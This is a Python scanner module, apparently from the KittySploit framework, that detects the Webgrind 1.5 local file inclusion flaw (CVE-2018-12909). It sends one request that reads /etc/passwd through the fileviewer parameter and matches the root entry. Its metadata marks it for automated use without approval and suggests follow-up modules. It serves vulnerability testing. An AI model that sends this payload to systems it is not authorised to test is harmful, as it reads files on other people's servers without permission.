#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Webgrind 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Webgrind <= 1.5 - Local File Inclusion Detection',
        'description': 'Webgrind 1.5 relies on user input to display a file, which lets anyone view files from the local filesystem (that the webserver user has access to) via an index.php?op=fileviewer&file= URI',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'lfi', 'webgrind', 'webgrind_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Webgrind%20fileviewer.phtml%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2018-12909.md',
            'https://github.com/jokkedk/webgrind/issues/112',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-12909',
            'https://github.com/KayCHENvip/vulnerability-poc',
            'https://github.com/Miraitowa70/POC-Notes',
        ],
        'cve': 'CVE-2018-12909',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?op=fileviewer&file=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'webgrind',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Webgrind <= 1.5 - Local File Inclusion detected",
                path='/index.php?op=fileviewer&file=/etc/passwd',
            )
            return True
        return False

